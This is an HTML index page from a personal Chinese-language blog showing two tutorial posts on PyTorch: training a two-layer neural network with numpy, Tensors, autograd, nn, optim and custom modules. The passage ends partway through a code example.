<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
  <link rel="mask-icon" href="/images/favicon.png" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="BruceFan&#39;s Blog">
<meta property="og:url" content="http://example.com/page/4/index.html">
<meta property="og:site_name" content="BruceFan&#39;s Blog">
<meta property="og:locale">
<meta property="article:author" content="Bruce Fan">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/4/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-Hans'
  };
</script>

  <title>BruceFan's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">BruceFan's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Stay hungry, stay foolish</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2018/05/28/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/05/28/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/" class="post-title-link" itemprop="url">神经网络</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2018-05-28 14:47:47" itemprop="dateCreated datePublished" datetime="2018-05-28T14:47:47+08:00">2018-05-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>当构建神经网络时，我们经常想把计算分配到各个layer，一些可学习参数(learnable parameter)在学习的过程中会被优化。在PyTorch中<code>nn</code>包提供了计算图(computational graph)的高级抽象，<code>nn</code>包定义了一系列<code>Module</code>，和神经网络的layer大致相同，Module接收输入Tensor，计算输出Tensor，同时也保存中间状态，如包含可学习参数的Tensor。<code>nn</code>包也定义了一系列有用的损失函数。</p>
<h3 id="PyTorch-nn"><a href="#PyTorch-nn" class="headerlink" title="PyTorch:nn"></a>PyTorch:nn</h3><p>接着上一篇前向传播和反向传播，下面用<code>nn</code>包来实现两层神经网络：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">N, D_in, H, D_out = <span class="number">64</span>, <span class="number">1000</span>, <span class="number">100</span>, <span class="number">10</span></span><br><span class="line"></span><br><span class="line">x = torch.randn(N, D_in)</span><br><span class="line">y = torch.randn(N, D_out)</span><br><span class="line"><span class="comment"># nn.Sequential是一个包含其他Module的模块，按顺序调用它们来产生输出</span></span><br><span class="line"><span class="comment"># 每个Linear模块用线性方程来计算输出，为weight和bias保留中间Tensor</span></span><br><span class="line">model = torch.nn.Sequential(</span><br><span class="line">        torch.nn.Linear(D_in, H),</span><br><span class="line">        torch.nn.ReLU(),</span><br><span class="line">        torch.nn.Linear(H, D_out),</span><br><span class="line">        )</span><br><span class="line"><span class="comment"># 这里用Mean Squared Error (MSE)作为损失函数</span></span><br><span class="line">loss_fn = torch.nn.MSELoss(size_average=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">learning_rate = <span class="number">1e-4</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    y_pred = model(x)</span><br><span class="line">    loss = loss_fn(y_pred, y)</span><br><span class="line">    <span class="built_in">print</span> t, loss.item()</span><br><span class="line">    model.zero_grad()</span><br><span class="line">    loss.backward()</span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> model.parameters():</span><br><span class="line">            param -= learning_rate * param.grad</span><br></pre></td></tr></table></figure>

<h3 id="PyTorch-optim"><a href="#PyTorch-optim" class="headerlink" title="PyTorch:optim"></a>PyTorch:optim</h3><p>到目前为止，我们通过手动调整保存可学习参数的Tensor来更新我们模型的weight，这对简单的优化算法（如随机梯度下降）来说不难，但是在实际情况中，我们经常用更复杂的优化器来训练神经网络，如AdaGrad、RMSProp、Adam等。optim包提供了这些优化算法的实现。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">N, D_in, H, D_out = <span class="number">64</span>, <span class="number">1000</span>, <span class="number">100</span>, <span class="number">10</span></span><br><span class="line"></span><br><span class="line">x = torch.randn(N, D_in)</span><br><span class="line">y = torch.randn(N, D_out)</span><br><span class="line"></span><br><span class="line">model = torch.nn.Sequential(</span><br><span class="line">        torch.nn.Linear(D_in, H),</span><br><span class="line">        torch.nn.ReLU(),</span><br><span class="line">        torch.nn.Linear(H, D_out),</span><br><span class="line">        )</span><br><span class="line">loss_fn = torch.nn.MSELoss(size_average=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">learning_rate = <span class="number">1e-4</span></span><br><span class="line">optimizer = torch.optim.Adam(model.parameters(), lr=learning_rate)</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    y_pred = model(x)</span><br><span class="line">    loss = loss_fn(y_pred, y)</span><br><span class="line">    <span class="built_in">print</span> t, loss.item()</span><br><span class="line">    <span class="comment">#model.zero_grad()</span></span><br><span class="line">    optimizer.zero_grad()</span><br><span class="line">    loss.backward()</span><br><span class="line">    optimizer.step()</span><br></pre></td></tr></table></figure>

<h3 id="PyTorch-自定义nn模块"><a href="#PyTorch-自定义nn模块" class="headerlink" title="PyTorch:自定义nn模块"></a>PyTorch:自定义nn模块</h3><p>有时我们想要定义一个比现有模块更复杂的模型，这时需要继承<code>nn.Module</code>并定义一个<code>forward</code>，使用其他模型或自动求导操作来接收输入Tensor，产生输出Tensor。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TwoLayerNet</span>(<span class="params">torch.nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, D_in, H, D_out</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(TwoLayerNet, self).__init__()</span><br><span class="line">        self.linear1 = torch.nn.Linear(D_in, H)</span><br><span class="line">        self.linear2 = torch.nn.Linear(H, D_out)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        h_relu = self.linear1(x).clamp(<span class="built_in">min</span>=<span class="number">0</span>)</span><br><span class="line">        y_pred = self.linear2(h_relu)</span><br><span class="line">        <span class="keyword">return</span> y_pred</span><br><span class="line"></span><br><span class="line">N, D_in, H, D_out = <span class="number">64</span>, <span class="number">1000</span>, <span class="number">100</span>, <span class="number">10</span></span><br><span class="line"></span><br><span class="line">x = torch.randn(N, D_in)</span><br><span class="line">y = torch.randn(N, D_out)</span><br><span class="line"></span><br><span class="line">model = TwoLayerNet(D_in, H, D_out)</span><br><span class="line"></span><br><span class="line">criterion = torch.nn.MSELoss(size_average=<span class="literal">False</span>)</span><br><span class="line">optimizer = torch.optim.SGD(model.parameters(), lr=<span class="number">1e-4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    y_pred = model(x)</span><br><span class="line">    loss = criterion(y_pred, y)</span><br><span class="line">    <span class="built_in">print</span> t, loss.item()</span><br><span class="line">    optimizer.zero_grad()</span><br><span class="line">    loss.backward()</span><br><span class="line">    optimizer.step()</span><br></pre></td></tr></table></figure>
<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://pytorch.org/tutorials/beginner/pytorch_with_examples.html#nn-module">PyTorch nn module</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2018/05/25/%E5%89%8D%E5%90%91%E4%BC%A0%E6%92%AD%E5%92%8C%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/05/25/%E5%89%8D%E5%90%91%E4%BC%A0%E6%92%AD%E5%92%8C%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%AD/" class="post-title-link" itemprop="url">前向传播和反向传播</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2018-05-25 14:26:31" itemprop="dateCreated datePublished" datetime="2018-05-25T14:26:31+08:00">2018-05-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>之前听过前向传播和反向传播，也看到项目中有这两个步骤，但是不知道具体是干什么的，在看<a target="_blank" rel="noopener" href="https://pytorch.org/tutorials/beginner/pytorch_with_examples.html">PyTorch官方教程</a>的时候看到一个用numpy实现的2层神经网络，里面实现了前向传播和反向传播，这里记录一下，同时也记录一下我的PyTorch学习过程。</p>
<h2 id="Numpy"><a href="#Numpy" class="headerlink" title="Numpy"></a>Numpy</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># N是batch大小；D_in是输入维度，H是隐藏维度；D_out是输出维度</span></span><br><span class="line">N, D_in, H, D_out = <span class="number">64</span>, <span class="number">1000</span>, <span class="number">100</span>, <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建任意输入和输出数据</span></span><br><span class="line">x = np.random.randn(N, D_in)</span><br><span class="line">y = np.random.randn(N, D_out)</span><br><span class="line"><span class="comment"># 随机初始化weight</span></span><br><span class="line">w1 = np.random.randn(D_in, H)</span><br><span class="line">w2 = np.random.randn(H, D_out)</span><br><span class="line"></span><br><span class="line">learning_rate = <span class="number">1e-6</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="comment"># 前向传播：计算预测的y</span></span><br><span class="line">    h = x.dot(w1) <span class="comment"># x:64*1000 w1:1000*100 h:64*100</span></span><br><span class="line">    h_relu = np.maximum(h, <span class="number">0</span>) <span class="comment"># 激活函数ReLU</span></span><br><span class="line">    y_pred = h_relu.dot(w2) <span class="comment"># h_relu:64*100 w2:100*10 y_pred:64*10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算打印loss</span></span><br><span class="line">    loss = np.square(y_pred - y).<span class="built_in">sum</span>()</span><br><span class="line">    <span class="built_in">print</span> t, loss</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 反向传播，根据loss计算w1和w2的gradient</span></span><br><span class="line">    grad_y_pred = <span class="number">2.0</span> * (y_pred - y) <span class="comment"># grad_y_pred:64*10</span></span><br><span class="line">    grad_w2 = h_relu.T.dot(grad_y_pred) <span class="comment"># h_relu.T:100*64 grad_w2:100*10</span></span><br><span class="line">    grad_h_relu = grad_y_pred.dot(w2.T) <span class="comment"># w2.T:10*100 grad_h_relu:64*100</span></span><br><span class="line">    grad_h = grad_h_relu.copy()</span><br><span class="line">    grad_h[h &lt; <span class="number">0</span>] = <span class="number">0</span> <span class="comment"># grad_h:64*100</span></span><br><span class="line">    grad_w1 = x.T.dot(grad_h) <span class="comment"># x.T:1000*64 grad_w1:1000*100</span></span><br><span class="line">    <span class="comment"># 更新weight</span></span><br><span class="line">    w1 -= learning_rate * grad_w1</span><br><span class="line">    w2 -= learning_rate * grad_w2</span><br></pre></td></tr></table></figure>

<h2 id="PyTorch-Tensor"><a href="#PyTorch-Tensor" class="headerlink" title="PyTorch:Tensor"></a>PyTorch:Tensor</h2><p>numpy是一个很棒的框架，但是它没有利用GPU加速计算，对现代的深度神经网络，GPU经常提供50倍以上的加速，所以numpy不适用于现在的深度学习。<br>PyTorch里一个基本的概念是<code>Tensor</code>，他和numpy里的array概念上是一样的，一个Tensor就是一个n维数组，PyTorch提供了大量的函数来操作这些Tensor。和numpy不同的是，PyTorch的Tensor可以利用GPU来加速计算。<br>下面用PyTorch的Tensor来实现刚才的2层神经网络：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">dtype = torch.<span class="built_in">float</span></span><br><span class="line">device = torch.device(<span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"><span class="comment"># dtype = torch.device(&quot;cuda:0&quot;) # 用GPU加速计算</span></span><br><span class="line"><span class="comment"># N是batch大小</span></span><br><span class="line">N, D_in, H, D_out = <span class="number">64</span>, <span class="number">1000</span>, <span class="number">100</span>, <span class="number">10</span></span><br><span class="line"><span class="comment"># 创建随机的输入和输出数据</span></span><br><span class="line">x = torch.randn(N, D_in, device=device, dtype=dtype)</span><br><span class="line">y = torch.randn(N, D_out, device=device, dtype=dtype)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机初始化weight</span></span><br><span class="line">w1 = torch.randn(D_in, H, device=device, dtype=dtype)</span><br><span class="line">w2 = torch.randn(H, D_out, device=device, dtype=dtype)</span><br><span class="line"></span><br><span class="line">learning_rate = <span class="number">1e-6</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="comment"># 前向传播：计算预测的y</span></span><br><span class="line">    h = x.mm(w1)</span><br><span class="line">    h_relu = h.clamp(<span class="built_in">min</span>=<span class="number">0</span>) <span class="comment"># 激活函数ReLU</span></span><br><span class="line">    y_pred = h_relu.mm(w2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算打印loss</span></span><br><span class="line">    loss = (y_pred - y).<span class="built_in">pow</span>(<span class="number">2</span>).<span class="built_in">sum</span>().item()</span><br><span class="line">    <span class="built_in">print</span> t, loss</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 反向传播</span></span><br><span class="line">    grad_y_pred = <span class="number">2.0</span> * (y_pred - y)</span><br><span class="line">    grad_w2 = h_relu.t().mm(grad_y_pred)</span><br><span class="line">    grad_h_relu = grad_y_pred.mm(w2.t())</span><br><span class="line">    grad_h = grad_h_relu.clone()</span><br><span class="line">    grad_h[h &lt; <span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">    grad_w1 = x.t().mm(grad_h)</span><br><span class="line">    <span class="comment"># 用梯度下降更新weight</span></span><br><span class="line">    w1 -= learning_rate * grad_w1</span><br><span class="line">    w2 -= learning_rate * grad_w2</span><br></pre></td></tr></table></figure>

<h2 id="PyTorch-autograd"><a href="#PyTorch-autograd" class="headerlink" title="PyTorch:autograd"></a>PyTorch:autograd</h2><p>上面我们手动实现了反向传播，对于2层的神经网络还可以，但是对更大的复杂网络就会非常困难，PyTorch提供了<code>自动微分（automatic differentiation）</code>功能来自动计算神经网络中的反向传播。这个功能在PyTorch的autograd包中，当使用autograd，网络的前向传播会定义一个计算图，图中的节点为Tensor，边是从输入Tensor产生输出Tensor的函数。这个图中的反向传播可以让我们很容易地计算梯度。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">dtype = torch.<span class="built_in">float</span></span><br><span class="line"></span><br><span class="line">N, D_in, H, D_out = <span class="number">64</span>, <span class="number">1000</span>, <span class="number">100</span>, <span class="number">10</span></span><br><span class="line"></span><br><span class="line">x = torch.randn(N, D_in, dtype=dtype)</span><br><span class="line">y = torch.randn(N, D_out, dtype=dtype)</span><br><span class="line"></span><br><span class="line">w1 = torch.randn(D_in, H, dtype=dtype, requires_grad=<span class="literal">True</span>)</span><br><span class="line">w2 = torch.randn(H, D_out, dtype=dtype, requires_grad=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">learning_rate = <span class="number">1e-6</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="comment"># 这里没有记录中间的隐藏层数据</span></span><br><span class="line">    y_pred = x.mm(w1).clamp(<span class="built_in">min</span>=<span class="number">0</span>).mm(w2)</span><br><span class="line">    <span class="comment"># loss是一个shape(1,)的Tensor</span></span><br><span class="line">    loss = (y_pred - y).<span class="built_in">pow</span>(<span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">    <span class="built_in">print</span> t, loss.item()</span><br><span class="line">    <span class="comment"># 用autograd计算反向传播，这里会根据所有设置了requires_grad=True的Tensor计算loss的梯度，</span></span><br><span class="line">    <span class="comment"># w1.grad和w2.grad将会保存loss对于w1和w2的梯度</span></span><br><span class="line">    loss.backward()</span><br><span class="line">    <span class="comment"># 手动更新weight，需要用torch.no_grad()，因为weight有required_grad=True，但我们不需要在</span></span><br><span class="line">    <span class="comment"># autograd中跟踪这个操作</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        w1 -= learning_rate * w1.grad</span><br><span class="line">        w2 -= learning_rate * w2.grad</span><br><span class="line">        <span class="comment"># 在更新weight后，手动将梯度归零</span></span><br><span class="line">        w1.grad.zero_()</span><br><span class="line">        w2.grad.zero_()</span><br></pre></td></tr></table></figure>

<h3 id="PyTorch-forward-backward"><a href="#PyTorch-forward-backward" class="headerlink" title="PyTorch:forward backward"></a>PyTorch:forward backward</h3><p>PyTorch中我们可以定义自己的autograd操作符，定义<code>torch.autograd.Function</code>的子类，并实现<code>forward</code>和<code>backward</code>函数，虽然还不是很明白，但是也先记录一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyReLU</span>(<span class="params">torch.autograd.Function</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    通过继承Function来实现自定义autograd函数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">ctx, <span class="built_in">input</span></span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        在前向传播中，我们接收一个Tensor包含输入，返回一个Tensor包含输出。ctx是一个上下文对象，</span></span><br><span class="line"><span class="string">        可以用来存放反向计算的信息，可以用ctx.save_for_backward方法缓存任意在反向传播中用到的对象</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        ctx.save_for_backward(<span class="built_in">input</span>) <span class="comment"># 这里input是x.mm(w1)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">input</span>.clamp(<span class="built_in">min</span>=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">backward</span>(<span class="params">ctx, grad_output</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        